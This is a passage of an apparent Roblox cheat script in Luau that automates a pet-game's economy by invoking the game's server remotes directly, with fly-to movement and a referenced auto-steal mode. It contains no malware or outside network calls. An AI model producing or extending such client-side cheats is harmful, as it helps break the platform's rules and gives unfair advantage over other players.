						Options = { "K/s", "M/s", "B/s" },
						ColorEnabled = true,
						Colors = {
							Number = Color3.fromRGB(255, 255, 255),
							Suffix = Color3.fromRGB(58, 255, 55),
						},
						Callback = function(arg)
							local ms = tbl30[arg] or tbl30["M/s"]

							if v21 and v21.SetRange then
								v21:SetRange(ms.Min, ms.Max)
								local min = tonumber(v21:Get()) or ms.Min
								local min2 = ms.Min
								local max = ms.Max
								local n18 = math.clamp(math.floor(min + 0.5), min2, max)

								if n18 ~= min then
									str3 = tostring(arg)
									v21:Set(n18)
									return
								end

								fn32(n18, arg)
							else
								fn32(nil, arg)
							end
						end,
					},
					SubOf = v12,
					Callback = function(arg)
						fn32(arg, nil)
					end,
				})
			end

			fn5(v10:CreateMultiDropdown({
				Name = "Always Favorite Species",
				Note = "Always favorite these species",
				Options = tbl16,
				Default = {},
				SubOf = v12,
				Callback = function(arg)
					local tbl30 = {}

					if type(arg) == "table" then
						for k, v21 in pairs(arg) do
							k = v21 == true and type(k) == "string" and k

							if k then
								v21 = k
							else
								v21 = type(v21) == "string" and v21
							end

							v21 = v21 or nil

							if v21 and tbl17[v21] then
								tbl30[tbl17[v21]] = true
							end
						end
					end

					tbl21 = tbl30
					tbl2.Wake()
				end,
			}))

			v13 = v10:CreateToggle({
				Name = "Auto Favorite Equipped",
				Note = "Keep equipped pets favorited",
				Default = false,
				Callback = function()
					tbl2.Wake()
				end,
			})

			v14 = v10:CreateToggle({
				Name = "Auto Unfavorite Equipped",
				Note = "Unfavorite equipped pets not in the rules",
				Default = false,
				Callback = function()
					tbl2.Wake()
				end,
			})

			v10:CreateButton({
				Name = "Favorite Equipped Now",
				Note = "Favorite all equipped pets once",
				ButtonText = "Favorite",
				ConfirmText = "Done!",
				Callback = function()
					local v21 = fn7()

					if v21 then
						fn31(fn30(v21, true, false), true)
					end
				end,
			})

			v10:CreateButton({
				Name = "Unfavorite Equipped Now",
				Note = "Unfavorite all equipped pets once",
				ButtonText = "Unfavorite",
				ConfirmText = "Done!",
				Callback = function()
					local v21 = fn7()

					if v21 then
						fn31(fn30(v21, false, false), false)
					end
				end,
			})

			local save = tbl.Save

			if type(save) == "table" and type(save.FieldSignal) == "function" then
				for _, v21 in ipairs({ "Inventory", "EquippedAssets" }) do
					local ok, result = pcall(save.FieldSignal, v21)

					if ok and type(result) == "table" and type(result.Connect) == "function" then
						local ok2, result2 = pcall(result.Connect, result, function()
							tbl2.Wake()
						end)

						if ok2 and result2 then
							fn4(function()
								pcall(function()
									result2:Disconnect()
								end)
							end)
						end
					end
				end
			end

			local n17
			n17 = 5
			local n18
			n18 = 5
			local v21
			v21 = nil
			local v22
			v22 = nil
			local flag5
			flag5 = false
			local n19
			n19 = 0
			local n20
			n20 = 0
			n16 = 0
			local v23
			v23 = nil
			local n21
			n21 = 0
			local flag6, fn32, fn33, fn34, v24

			do
				local str3 = ""
				flag6 = false

				local function fn35(arg, arg2)
					local v25 = networking:FindFirstChild(arg)
					if not v25 or not v25:IsA("RemoteFunction") then
						return false, nil, nil
					end

					if arg2 == nil then
						return pcall(v25.InvokeServer, v25)
					end
					return pcall(v25.InvokeServer, v25, arg2)
				end

				local function fn36()
					local save2 = tbl.Save
					if type(save2) ~= "table" or type(save2.Get) ~= "function" then
						return nil
					end
					local ok, result = pcall(save2.Get)
					return ok and type(result) == "table" and result or nil
				end

				local function fn37(arg)
					local directory = tbl.Assets and tbl.Assets.Directory
					local flag7 = type(directory) == "table" and directory[tostring(arg)] or nil
					return tostring(type(flag7) == "table" and flag7.DisplayName or arg)
				end

				fn32 = function(arg)
					if not arg and type(v23) == "table" and os.clock() < n16 then
						return v23
					end
					n16 = os.clock() + n18
					local AskState, v25 = fn35("RF/Rift/AskState")

					if AskState and type(v25) == "table" then
						v23 = v25
						n21 = os.clock()
					end

					return v23
				end

				local function fn38(arg, arg2)
					local requirements = type(arg) == "table" and arg.Requirements or nil
					if type(requirements) ~= "table" or #requirements == 0 then
						return nil, "No active recipe"
					end
					local tbl30 = {}

					if type(arg2.EquippedAssets) == "table" then
						for _, equippedAsset in pairs(arg2.EquippedAssets) do
							tbl30[equippedAsset] = true
						end
					end

					local tbl31 = {}

					for _, requirement in ipairs(requirements) do
						tbl31[tostring(requirement)] = {}
					end

					local v25 = pairs
					local inventory = arg2.Inventory or {}

					for k, v26 in v25(inventory) do
						local flag7 = type(v26) == "table" and tbl31[tostring(v26.Category)] or nil

						if flag7 and v26.InFuse ~= true and v26.IsFavorite ~= true and not tbl30[k] then
							local flag8 = type(v26.Mutations) == "table" and next(v26.Mutations) ~= nil
							table.insert(flag7, { Uid = k, Scale = tonumber(v26.Scale) or 0, Mutated = flag8 })
						end
					end

					for _, v26 in pairs(tbl31) do
						table.sort(v26, function(arg3, arg4)
							if arg3.Mutated ~= arg4.Mutated then
								return arg4.Mutated
							end
							return arg3.Scale < arg4.Scale
						end)
					end

					local tbl32 = {}
					local tbl33 = {}

					for _, requirement in ipairs(requirements) do
						local v26 = tbl31[tostring(requirement)]
						local v27 = ipairs
						local tbl34 = v26 or {}
						local v28 = nil

						for _, v29 in v27(tbl34) do
							if not tbl33[v29.Uid] then
								v28 = v29
								break
							else
								v28 = nil
							end
						end

						if not v28 then
							return nil, "Missing " .. fn37(requirement)
						end
						tbl33[v28.Uid] = true
						table.insert(tbl32, v28.Uid)
					end

					return tbl32
				end

				fn33 = function()
					local v25 = v23
					if type(v25) ~= "table" then
						return "Rift status unknown"
					end

					if v25.Unlocked ~= true then
						return "Rift is locked on this account"
					end
					local tbl30 = {}
					local v26 = ipairs
					local requirements = v25.Requirements or {}

					for _, requirement in v26(requirements) do
						table.insert(tbl30, fn37(requirement))
					end

					local n22 = (tonumber(v25.SecondsUntilRotation) or 0) - os.clock() - n21

					if n22 < 0 then
						n22 = 0
					end

					local str4 = string.format("%s  -  needs %s  -  pity %s/%s  -  free rerolls %s  -  rotates in %d:%02d", tostring(v25.BannerDisplayName or v25.BannerId or "Rift"), #tbl30 > 0 and table.concat(tbl30, ", ") or "unknown", tostring(v25.PityCount or 0), tostring(v25.PityThreshold or 0), tostring(v25.FreeRefreshesRemaining or 0), math.floor(n22 / 60), math.floor(n22 % 60))

					if str3 ~= "" then
						str4 ..= "  -  " .. str3
					end

					return str4
				end

				fn34 = function(arg)
					local v25 = fn32(true)
					if type(v25) ~= "table" or v25.Unlocked ~= true then
						return
					end

					if v25.PendingReward ~= nil and v25.PendingReward ~= false then
						local AskFinishReveal, v26 = fn35("RF/Rift/AskFinishReveal")
						str3 = AskFinishReveal and v26 ~= false and "Reward claimed" or "Reward claim failed"
						n16 = 0
						return
					end

					local v26 = fn36()
					if not v26 then
						return
					end
					local v27, v28 = fn38(v25, v26)

					if not v27 then
						str3 = v28 or "Recipe not ready"
						local flag7 = arg == n19 and tbl3.Toggle(v22, false)

						if flag7 then
							flag7 = (tonumber(v25.FreeRefreshesRemaining) or 0) > 0
						end

						if flag7 then
							local AskRefresh, v29, v30 = fn35("RF/Rift/AskRefresh")

							if AskRefresh and v29 ~= false then
								str3 = "Recipe rerolled"
							else
								str3 = tostring(v30 or "Reroll rejected")
							end

							n16 = 0
						end

						return
					end

					if not tbl3.Toggle(v21, false) then
						str3 = "Ready to sacrifice"
						return
					end

					if arg ~= n19 then
						return
					end
					local AskTradeIn, v29, v30 = fn35("RF/Rift/AskTradeIn", v27)

					if AskTradeIn and v29 ~= false then
						str3 = "Sacrifice sent"
					else
						str3 = tostring(v30 or "Trade rejected")
					end

					n16 = 0
				end

				v24 = v11:CreateText({ Name = "Rift Machine Status", Text = "Loading Rift data..." })

				v21 = v11:CreateToggle({
					Name = "Auto Rift Sacrifice",
					Note = "Trade the 3 required pets into the Rift machine",
					Default = false,
					Callback = function()
						n19 += 1
						str3 = ""
						n20 = 0
						n16 = 0
						tbl2.Wake()
					end,
				})

				v22 = v11:CreateToggle({
					Name = "Auto Reroll Rift Recipe",
					Note = "Reroll the recipe when a pet is missing and free rerolls remain",
					Default = false,
					Callback = function()
						n19 += 1
						str3 = ""
						n20 = 0
						n16 = 0
						tbl2.Wake()
					end,
				})
			end

			for _, v25 in ipairs({
				{ Key = "Place", Name = "Place Rift Recipe Eggs" },
				{ Key = "Hatch", Name = "Hatch Rift Recipe Eggs" },
			}) do
				local key = v25.Key

				tbl3.Rift.Handles[key] = v11:CreateToggle({
					Name = v25.Name,
					Default = false,
					Callback = function()
						tbl3.Rift.Next = 0
						local v26 = tbl3.Rift.Restart[key]

						if type(v26) == "function" then
							v26()
						end

						tbl2.Wake()
					end,
				})
			end

			local tbl30

			tbl30 = {
				{ Label = "Mutation Consumable", Id = "MutationConsumable", Price = 400 },
				{ Label = "2x Cash Booster", Id = "CashBooster", Price = 175 },
				{ Label = "2x Treadmill Booster", Id = "TreadmillBooster", Price = 200 },
				{ Label = "1.25x Speed", Id = "SpeedBoost", Price = 225 },
			}

			local tbl31
			tbl31 = {}

			for _, v25 in ipairs(tbl30) do
				tbl31[#tbl31 + 1] = v25.Label
			end

			local createToggle
			createToggle = nil

			do
				local tbl32 = { ["Mutation Consumable"] = true }
				local n22 = 0
				local n23 = 0
				local BossMastery = nil

				pcall(function()
					BossMastery = require(ReplicatedStorage.Data.BossMastery)
				end)

				local function fn35(arg)
					if type(BossMastery) == "table" then
						local ok, result = pcall(BossMastery.GetShopPrice, arg.Id)
						if ok and type(result) == "number" and result > 0 then
							return result
						end

						if type(BossMastery.ShopProducts) == "table" then
							for _, shopProduct in ipairs(BossMastery.ShopProducts) do
								if shopProduct.Id == arg.Id and type(shopProduct.Price) == "number" then
									return shopProduct.Price
								end
							end
						end
					end

					return arg.Price
				end

				local function fn36()
					local playerGui = localPlayer and localPlayer:FindFirstChild("PlayerGui")
					playerGui = playerGui and playerGui:FindFirstChild("BossShop")
					if not playerGui then
						return nil
					end
					local amount = playerGui:FindFirstChild("Amount", true)
					if not amount or not amount:IsA("TextLabel") then
						return nil
					end
					local v25 = string.gsub(tostring(amount.Text), "[^%d]", "")
					if v25 == "" then
						return nil
					end
					return tonumber(v25)
				end

				local function fn37()
					local packages = ReplicatedStorage:FindFirstChild("Packages")
					packages = packages and packages:FindFirstChild("Networking")
					packages = packages and packages:FindFirstChild("RF/BossMastery/AskBuyShopItem")
					if packages and packages:IsA("RemoteFunction") then
						return packages
					end
					return nil
				end

				local function fn38(arg)
					local v25 = fn37()
					if not v25 then
						return false
					end

					local ok, result = pcall(function()
						return v25:InvokeServer(arg.Id)
					end)

					ok = ok and result ~= false and result ~= nil

					if ok then
						tbl3.BossShopStock = (tonumber(tbl3.BossShopStock) or 0) + 1
					end

					return ok
				end

				local function fn39(arg)
					local v25 = fn36()
					if v25 == nil then
						return
					end

					for _, v26 in ipairs(tbl30) do
						if arg ~= n23 then
							return
						end

						if tbl32[v26.Label] ~= true then
							continue
						end
						local v27 = fn35(v26)
						local n24 = 0

						while v25 ~= nil and v25 - v27 >= n22 and n24 < 25 do
							if arg ~= n23 or not tbl3.Toggle(createToggle, false) then
								return
							end

							if not fn38(v26) then
								break
							end
							n24 += 1
							task.wait(0.45)
							v25 = fn36()
						end
					end
				end

				local tbl33 = {
					Name = "Auto Buy Boss Shop",
					Note = "Spend Boss Tokens on the picked Boss Shop items",
					Default = false,
					Callback = function(arg)
						n23 += 1
						if arg ~= true then
							return
						end
						local v25 = n23

						task.spawn(function()
							while v25 == n23 and tbl3.Toggle(createToggle, false) do
								pcall(fn39, v25)

								for i = 1, 12 do
									if v25 ~= n23 then
										return
									end
									task.wait(0.5)
								end
							end
						end)
					end,
				}

				createToggle = v11.CreateToggle
				createToggle = createToggle(v11, tbl33)

				fn5(v11:CreateMultiDropdown({
					Name = "Boss Shop Items",
					Options = tbl31,
					Default = { "Mutation Consumable" },
					SubOf = createToggle,
					Callback = function(arg)
						local tbl34 = {}

						if type(arg) == "table" then
							for k, v25 in pairs(arg) do
								if v25 == true and type(k) == "string" then
									tbl34[k] = true
								elseif type(v25) == "string" then
									tbl34[v25] = true
								end
							end
						end

						tbl32 = tbl34
					end,
				}))

				v11:CreateSlider({
					Name = "Keep Boss Tokens",
					Note = "Stop buying once the balance would drop below this",
					Min = 0,
					Max = 20000,
					Default = 0,
					Increment = 50,
					Unit = "",
					SubOf = createToggle,
					Callback = function(arg)
						n22 = math.max(0, tonumber(arg) or 0)
					end,
				})

				fn4(function()
					n23 += 1
				end)
			end

			local tbl32
			tbl32 = { "Highest Value", "Best Rarity", "Biggest Size" }
			local v25
			v25 = nil
			local n22
			n22 = 0
			local n23
			n23 = 0
			local tbl33
			tbl33 = { Value = 0 }
			local str3
			str3 = tbl32[1]
			local flag7
			flag7 = true
			local tbl34
			tbl34 = {}
			local tbl35
			tbl35 = {}

			do
				local directory = tbl.Assets and tbl.Assets.Directory
				local tbl36 = {}

				if type(directory) == "table" then
					for k, v26 in pairs(directory) do
						local rarity = type(v26) == "table" and v26.Rarity or nil
						local flag8 = type(rarity) == "table"

						if flag8 then
							flag8 = tonumber(rarity.RarityNumber or rarity.Rank)
						end

						flag8 = flag8 or nil

						if flag8 then
							table.insert(tbl36, {
								Category = tostring(k),
								Name = tostring(v26.DisplayName or k),
								Rarity = flag8,
								RarityName = tostring(rarity.DisplayName or rarity._id or flag8),
							})
						end
					end
				end

				table.sort(tbl36, function(arg, arg2)
					if arg.Rarity ~= arg2.Rarity then
						return arg.Rarity > arg2.Rarity
					end
					return arg.Name < arg2.Name
				end)

				for _, v26 in ipairs(tbl36) do
					local str4 = string.format("%s [%s]", v26.Name, v26.RarityName)

					if tbl35[str4] then
						str4 = string.format("%s [%s] (%s)", v26.Name, v26.RarityName, v26.Category)
					end

					table.insert(tbl34, str4)
					tbl35[str4] = v26.Category
				end
			end

			local tbl36
			tbl36 = {}
			local n24
			n24 = 0
			local str4
			str4 = "Idle"
			local fn35
			fn35 = nil
			local str5
			str5 = "idle"
			local str6
			str6 = "Turn it on to start applying Fractured"
			local str7
			str7 = "#FFFFFF"
			local str8
			str8 = ""
			local tbl37
			tbl37 = {}
			local v26
			v26 = nil
			local n25
			n25 = 0
			local n26
			n26 = 0
			local fn36
			fn36 = nil
			local fn37

			fn37 = function(arg)
				local directory = tbl.Assets and tbl.Assets.Directory
				return type(directory) == "table" and directory[tostring(arg)] or nil
			end

			local fn38

			fn38 = function(arg)
				local v27 = fn37(arg.AssetCategory)
				local rarity = type(v27) == "table" and v27.Rarity or nil
				local flag8 = type(rarity) == "table"

				if flag8 then
					flag8 = tonumber(rarity.RarityNumber or rarity.Rank)
				end

				return flag8 or 0
			end

			local fn39

			fn39 = function(arg)
				local v27 = fn37(arg.AssetCategory)
				local n27 = type(v27) == "table" and tonumber(v27.EarningRate) or 0
				local n28 = tonumber(arg.AssetScale) or 0
				if n27 <= 0 or n28 <= 0 then
					return 0
				end
				return n27 * (n28 > 5 and (n28 / 5) ^ 1.2 * 19.637875755794113 or n28 ^ 1.85)
			end

			local n27

			do
				local function fn40(arg)
					if tostring(arg.BaseMutation or "") == "Boss" then
						return true
					end

					if type(arg.Mutations) == "table" then
						for k, mutation in pairs(arg.Mutations) do
							if type(mutation) == "string" and mutation == "Boss" then
								return true
							end

							if type(k) == "string" and k == "Boss" and mutation ~= false then
								return true
							end
						end
					end

					return false
				end

				local function fn41()
					local eggState = tbl.EggState
					if type(eggState) ~= "table" or type(eggState.ReadOwnerEggs) ~= "function" then
						return {}
					end
					local ok, result = pcall(eggState.ReadOwnerEggs, localPlayer.UserId)
					if not ok or type(result) ~= "table" then
						return {}
					end
					local tbl38 = {}

					for k, v27 in pairs(result) do
						if type(v27) == "table" and v27.Placement ~= nil then
							v27.Uid = v27.Uid or k
							tbl38[#tbl38 + 1] = v27
						end
					end

					return tbl38
				end

				local n28 = 6

				local function fn42(arg)
					local uid = arg and arg.Uid

					if uid then
						local areaEggSlotsClient = workspace:FindFirstChild("AreaEggSlotsClient")
						areaEggSlotsClient = areaEggSlotsClient and areaEggSlotsClient:FindFirstChild(uid)

						if areaEggSlotsClient then
							local ok, result = pcall(function()
								return areaEggSlotsClient:GetPivot().Position
							end)

							if ok and typeof(result) == "Vector3" then
								return result
							end
						end
					end

					if type(tbl3.PenAnchor) == "function" then
						local ok, result = pcall(tbl3.PenAnchor)
						if ok and typeof(result) == "Vector3" then
							return result
						end
					end

					return nil
				end

				local function fn43(arg, arg2)
					local v27 = fn42(arg)
					if v27 == nil then
						return true
					end

					if tbl3.DistanceTo(v27) <= n28 then
						return true
					end

					local function fn44()
						if arg2 ~= n22 or not tbl3.Toggle(v25, false) then
							return true
						end
						return tbl3.Movement.PlaceWanted == true or tbl3.Movement.ScrambleWanted == true or tbl3.Steal.Wanted == true
					end

					if tbl3.Treadmill.Riding or tbl3.OnBelt() then
						tbl3.ExitBelt()
					end

					tbl3.HoldBelt()
					local ok, result = pcall(tbl3.FlyTo, v27 + Vector3.new(0, 3, 0), fn44, "fractured")
					tbl3.ReleaseBelt()
					tbl3.LeaveBelt()
					result = ok and result
					local flag8

					if result then
						local n29 = n28 + 4
						flag8 = tbl3.DistanceTo(v27) <= n29
					else
						flag8 = result
					end

					return flag8
				end

				local function fn44()
					local character = localPlayer.Character

					local function fn45(arg)
						if not arg or not arg:IsA("Tool") then
							return false
						end

						if tostring(arg:GetAttribute("ItemType")) ~= "MutationConsumable" then
							return false
						end
						local attribute = arg:GetAttribute("MutationId") or arg:GetAttribute("MutationTemplate")
						if attribute ~= nil then
							return tostring(attribute) == "Boss"
						end
						local v27 = string.lower(arg.Name)
						return string.find(v27, "mutation consumable", 1, true) ~= nil and string.find(v27, "scrambled", 1, true) == nil
					end

					if character then
						for _, child in ipairs(character:GetChildren()) do
							if fn45(child) then
								return child, true
							end
						end
					end

					local backpack = localPlayer:FindFirstChildOfClass("Backpack")

					if backpack then
						for _, child in ipairs(backpack:GetChildren()) do
							if fn45(child) then
								return child, false
							end
						end
					end

					return nil, false
				end

				local function fn45(arg)
					if not arg then
						return 0
					end
					local num = tonumber(arg:GetAttribute("Uses"))
					if num ~= nil then
						return num
					end
					local v27 = string.match(arg.Name, "%[X(%d+)%]")
					return tonumber(v27) or 1
				end

				local function fn46()
					local v27 = fn44()
					if not v27 then
						return nil, 0
					end
					local v28 = fn45(v27)
					if v28 <= 0 then
						return nil, 0
					end
					return v27, v28
				end

				local function fn47(arg)
					local character = localPlayer.Character
					local humanoid = character and character:FindFirstChildOfClass("Humanoid")
					if not character or not humanoid or not arg or arg.Parent == nil then
						return false
					end

					if arg.Parent ~= character then
						pcall(function()
							humanoid:EquipTool(arg)
						end)

						if arg.Parent ~= character then
							pcall(function()
								arg.Parent = character
							end)
						end

						task.wait(0.2)
					end

					return arg.Parent == character
				end

				local uid = nil

				local function fn48()
					local n29 = -1
					local v27 = nil

					for _, v28 in ipairs(fn41()) do
						local flag8 = true

						if flag7 then
							flag8 = fn40(v28)
						end

						local flag9 = false

						if flag8 then
							flag9 = true
						end

						if not flag9 and fn38(v28) < n23 then
							flag9 = true
						end

						local flag10 = not flag9 and tbl33.Value > 0

						if flag10 then
							local value = tbl33.Value
							flag10 = fn39(v28) < value
						end

						if flag10 then
							flag9 = true
						end

						if not flag9 and next(tbl36) ~= nil and tbl36[tostring(v28.AssetCategory)] ~= true then
							flag9 = true
						end

						if not flag9 then
							local n30

							if str3 == tbl32[2] then
								n30 = fn38(v28) * 1000 + (tonumber(v28.AssetScale) or 0)
							elseif str3 == tbl32[3] then
								n30 = tonumber(v28.AssetScale) or 0
							else
								n30 = fn39(v28)
							end

							local flag11 = n30 > n29

							if not flag11 and v27 ~= nil and n30 == n29 and v28.Uid == uid then
								n29 = n30
								v27 = v28
							elseif flag11 then
								n29 = n30
								v27 = v28
							end
						end
					end

					return v27
				end

				local n29 = 0
				n27 = 0

				local tbl38 = {
					Over = function(arg)
						if arg ~= n22 or not tbl3.Toggle(v25, false) then
							return true
						end
						return tbl3.Movement.PlaceWanted == true or tbl3.Movement.ScrambleWanted == true or tbl3.Steal.Wanted == true
					end,
					Apply = function(arg, arg2)
						if not fn47(arg2) then
							str5 = "work"
							str4 = "Could not hold the consumable"
							n24 = os.clock() + 2
							return false
						end

						local packages = ReplicatedStorage:FindFirstChild("Packages")
						packages = packages and packages:FindFirstChild("Networking")
						local rfBossMasteryAskUseMutationConsu = packages and packages:FindFirstChild("RF/BossMastery/AskUseMutationConsumable")

						if not rfBossMasteryAskUseMutationConsu or not rfBossMasteryAskUseMutationConsu:IsA("RemoteFunction") then
							str5 = "stop"
							str4 = "Mutation remote is missing"
							n24 = os.clock() + 10
							return false
						end

						str5 = "work"
						str4 = "Applying Fractured"
						n25 += 1

						local ok, result = pcall(function()
							return rfBossMasteryAskUseMutationConsu:InvokeServer(arg.Uid)
						end)

						if not ok or type(result) ~= "table" then
							n24 = os.clock() + 10
							return false
						end

						if result.Success == true then
							str4 = "Fractured applied"
							uid = nil
							str5 = "good"
							n26 += 1
							return true
						end

						local str9 = tostring(result.Message or "")
						local v27 = string.lower(str9)
						str4 = str9 ~= "" and str9 or "Try failed"
						str5 = "work"

						if string.find(v27, "not found") or string.find(v27, "invalid") then
							uid = nil
							n24 = os.clock() + 3
							return false
						end

						return true
					end,
					Settle = function()
						local n30 = os.clock() + 3

						while os.clock() < n30 do
							if tbl3.Grounded() then
								return
							end
							RunService.Heartbeat:Wait()
						end
					end,
				}

				local function fn49(arg)
					local n30 = tonumber(tbl3.BossShopStock) or 0

					if n30 ~= n29 then
						n29 = n30
						n24 = 0
					end

					if os.clock() < n24 then
						return
					end

					if tbl3.Movement.ScrambleWanted == true or tbl3.Steal.Wanted == true then
						str5 = "work"
						str4 = tbl3.Movement.ScrambleWanted == true and "Drone hunt goes first" or "Auto Steal goes first"
						n24 = os.clock() + 2
						return
					end

					local v27, v28 = fn46()

					if not v27 then
						str5 = "idle"
						str4 = "Need Mutation Consumable"
						n27 = 0
						str6 = ""
						str7 = "#C7CBD6"
						str8 = ""
						n24 = os.clock() + 5
						return
					end

					n27 = v28
					local v29 = fn48()

					if not v29 or not v29.Uid then
						str5 = "stop"
						str4 = "Waiting"

						if fn36 then
							fn36(nil)
						end

						return
					end

					if v29.Uid ~= uid then
						uid = v29.Uid
						str4 = "New target picked"
					end

					if fn36 then
						fn36(v29)
					end

					if tbl3.Movement.PlaceWanted == true then
						str5 = "work"
						str4 = "Auto Place goes first"
						n24 = os.clock() + 2
						return
					end

					if not tbl3.ClaimMovement("fractured") then
						str5 = "work"
						str4 = "Waiting for " .. tostring(tbl3.Movement.Owner or "movement")
						n24 = os.clock() + 2
						return
					end

					tbl3.Movement.FracturedWanted = true

					local ok, result = pcall(function()
						while not tbl38.Over(arg) do
							local v30, v31 = fn46()

							if v30 then
								n27 = v31
								local v32 = fn48()

								if not v32 or not v32.Uid then
									str5 = "stop"
									str4 = "Waiting"

									if fn36 then
										fn36(nil)
									end

									break
								else
									if v32.Uid ~= uid then
										uid = v32.Uid
										str4 = "New target picked"
									end

									if fn36 then
										fn36(v32)
									end

									if not fn43(v32, arg) then
										str5 = "work"
										str4 = "Could not reach the egg"
										n24 = os.clock() + 3
										break
									elseif not (tbl38.Over(arg) or not tbl38.Apply(v32, v30)) then
										pcall(fn35)
										task.wait(0.35)
										continue
									end
								end
							end

							break
						end
					end)

					if not ok then
						str4 = "Stopped: " .. tostring(result)
						str5 = "work"
						n24 = os.clock() + 3
					end

					tbl38.Settle()
					tbl3.Movement.FracturedWanted = false
					tbl3.ReleaseMovement("fractured")
				end

				v25 = v11:CreateToggle({
					Name = "Auto Use Fractured Mutation",
					Note = "Apply Fractured to your best placed egg, 10 percent per try",
					Default = false,
					Callback = function(arg)
						n22 += 1
						tbl3.Movement.FracturedWanted = false
						tbl3.ReleaseMovement("fractured")
						if arg ~= true then
							return
						end
						local v27 = n22

						task.spawn(function()
							while v27 == n22 and tbl3.Toggle(v25, false) do
								pcall(fn49, v27)
								pcall(fn35)
								task.wait(str5 == "idle" and 3 or 1)
							end
						end)
					end,
				})
			end

			do
				local tbl38 = { idle = "#8C93A6", work = "#FFC857", good = "#57E08A", stop = "#FF6B6B" }
				local v27 = nil
				local idle = tbl38.idle

				local function fn40(arg)
					if typeof(arg) ~= "Color3" then
						return "#FFFFFF"
					end
					return string.format("#%02X%02X%02X", math.floor(arg.R * 255 + 0.5), math.floor(arg.G * 255 + 0.5), math.floor(arg.B * 255 + 0.5))
				end

				local function fn41(arg)
					local ok, result = pcall(Color3.fromHex, arg)
					if not ok or typeof(result) ~= "Color3" then
						return arg
					end
					local v28, v29, v30 = result:ToHSV()
					return fn40(Color3.fromHSV(v28, math.min(v29, 0.78), math.max(v30, 0.82)))
				end

				local function fn42(arg)
					local v28 = fn37(arg and arg.AssetCategory)
					local icon = type(v28) == "table" and v28.Icon or nil
					if icon == nil then
						return ""
					end

					if tonumber(icon) then
						return "rbxassetid://" .. tostring(icon)
					end
					return tostring(icon)
				end

				local function fn43(arg)
					local v28 = fn37(arg and arg.AssetCategory)
					local rarity = type(v28) == "table" and v28.Rarity or nil
					local flag8 = type(rarity) == "table"

					if flag8 then
						flag8 = tostring(rarity.DisplayName or rarity._id or "")
					end

					return flag8 or "", fn41(fn40(type(rarity) == "table" and rarity.Color or nil))
				end

				local function fn44(arg)
					if type(arg) ~= "table" then
						return "No egg selected"
					end
					local v28 = fn37(arg.AssetCategory)
					local flag8 = type(v28) == "table"

					if flag8 then
						flag8 = tostring(v28.DisplayName or arg.AssetCategory)
					end

					return flag8 or tostring(arg.AssetCategory)
				end

				fn35 = function()
					idle = tbl38[str5] or tbl38.idle

					if tbl37.Accent and type(tbl37.Accent.Set) == "function" then
						tbl37.Accent.Set({ Background = idle })
					end

					if tbl37.Title and type(tbl37.Title.Set) == "function" then
						tbl37.Title.Set({ Text = str4, Color = idle })
					end

					if tbl37.Egg and type(tbl37.Egg.Set) == "function" then
						tbl37.Egg.Set({ Text = str6, Color = str7 })
					end

					if tbl37.Meta and type(tbl37.Meta.Set) == "function" then
						tbl37.Meta.Set({ Text = string.format("Left %d   Tries %d   Applied %d", n27, n25, n26) })
					end

					if tbl37.Icon and type(tbl37.Icon.Set) == "function" then
						tbl37.Icon.Set({ Visible = str8 ~= "", Image = str8, StrokeColor = str7 })
					end

					if v26 and type(v26.Set) == "function" then
						pcall(v26.Set, v26, str4 .. "  -  " .. str6)
					end
				end

				fn36 = function(arg)
					if type(arg) ~= "table" then
						str6 = "No egg matches the filters"
						str7 = "#C7CBD6"
						str8 = ""
						return
					end

					local v28, v29 = fn43(arg)
					local n28 = tonumber(arg.AssetScale) or 0
					str6 = string.format("%s   %.2f kg", fn44(arg), n28)

					if v28 ~= "" then
						str6 ..= "   " .. string.upper(v28)
					end

					str7 = v29
					str8 = fn42(arg)
				end

				if type(v11.CreateCanvas) == "function" then
					local v28 = v11:CreateCanvas({
						Name = "Mutation Status",
						ShowTitle = false,
						Layout = "free",
						SubOf = v25,
						Style = {
							TextScale = 1,
							LineHeight = 1.1,
							MinLines = 4,
							MaxLines = 4,
							AutoHeight = true,
							BackgroundTransparency = 0.35,
							TextColor = Color3.fromRGB(255, 255, 255),
							TextStrokeTransparency = 0.7,
						},
						Build = function(arg)
							v27 = arg

							tbl37.Card = arg:Frame({
								X = 0,
								Y = 0,
								Width = 1,
								Height = 3.6,
								Corner = 0.3,
								Background = "#151821",
								BackgroundTransparency = 0.25,
							})

							tbl37.Accent = arg:Frame({
								Parent = tbl37.Card,
								X = 0.08,
								Y = 0.18,
								Width = 0.16,
								Height = 3.24,
								Corner = 0.2,
								Background = tbl38.idle,
							})

							tbl37.Icon = arg:Image({
								Parent = tbl37.Card,
								X = 0.42,
								Y = 0.3,
								Width = 3,
								Height = 3,
								Corner = 0.3,
								Background = "#242938",
								BackgroundTransparency = 0.1,
								StrokeThickness = 0.06,
								StrokeTransparency = 0,
								Visible = false,
							})

							tbl37.Title = arg:Text({
								Parent = tbl37.Card,
								X = 3.7,
								Y = 0.32,
								Width = 1,
								Height = 1.05,
								Scale = 1.16,
								Wrap = false,
								Text = str4,
								Color = tbl38.idle,
								TextStrokeTransparency = 1,
							})

							tbl37.Egg = arg:Text({
								Parent = tbl37.Card,
								X = 3.7,
								Y = 1.42,
								Width = 1,
								Height = 1,
								Scale = 1,
								Wrap = false,
								Text = str6,
								Color = "#FFFFFF",
								TextStrokeTransparency = 1,
							})

							tbl37.Meta = arg:Text({
								Parent = tbl37.Card,
								X = 3.7,
								Y = 2.42,
								Width = 1,
								Height = 0.9,
								Scale = 0.86,
								Wrap = false,
								Text = "Left 0   Tries 0   Applied 0",
								Color = "#AEB4C6",
								TextStrokeTransparency = 1,
							})

							fn35()
						end,
					})

					fn4(function()
						pcall(function()
							v28:Destroy()
						end)
					end)
				else
					v26 = v11:CreateText({ Name = "Mutation Status", Text = "Idle", SubOf = v25 })
				end
			end

			v11:CreateDropdown({
				Name = "Mutation Min Rarity",
				Note = "Only eggs of this rarity and above are used",
				Options = tbl11,
				Default = tbl11[1],
				SubOf = v25,
				Callback = function(arg)
					n23 = tbl12[arg] or 0
				end,
			})

			do
				local tbl38 = {
					["K/s"] = { Min = 0, Max = 1000, Mult = 1000 },
					["M/s"] = { Min = 0, Max = 1000, Mult = 1000000 },
					["B/s"] = { Min = 0, Max = 100, Mult = 1e9 },
				}

				local tbl39 = { Slider = nil, Value = 0, Unit = "M/s" }

				local function fn40(arg, arg2)
					if arg ~= nil then
						tbl39.Value = math.max(0, math.floor(tonumber(arg) or tbl39.Value))
					end

					if arg2 ~= nil then
						tbl39.Unit = tostring(arg2)
					end

					tbl33.Value = tbl39.Value * (tbl38[tbl39.Unit] or tbl38["M/s"]).Mult
				end

				tbl39.Slider = v11:CreateSlider({
					Name = "Mutation Min Value",
